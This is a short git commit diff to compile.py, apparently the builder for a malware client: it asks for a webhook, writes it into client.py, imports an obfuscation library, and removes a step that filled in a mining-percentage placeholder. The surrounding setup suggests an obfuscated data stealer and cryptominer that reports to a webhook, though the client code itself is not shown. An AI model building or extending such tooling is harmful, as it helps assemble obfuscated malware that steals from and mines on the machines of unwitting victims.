21b4c0f1a6265348953be1b8c3d7b6ccfb9a2187
0xSxZ <57729495+0xSxZ@users.noreply.github.com>
2022-08-21 01:04:06 +0200

    Update compile.py

--- compile.py
+++ compile.py
@@ -7,7 +7,7 @@ import pyImpossibleObf
 key ="loooood"
 webhook = input("Webhook : ")
 filecontent = open("client.py", "r").read()
-filecontent = filecontent.replace("webhook667", webhook).replace("miningpercentEKIP", str(miningpercent))
+filecontent = filecontent.replace("webhook667", webhook)
 open("client.py", "w",encoding="utf-8").write(str(filecontent))
 print("[.] Replaced variables in file.")
 
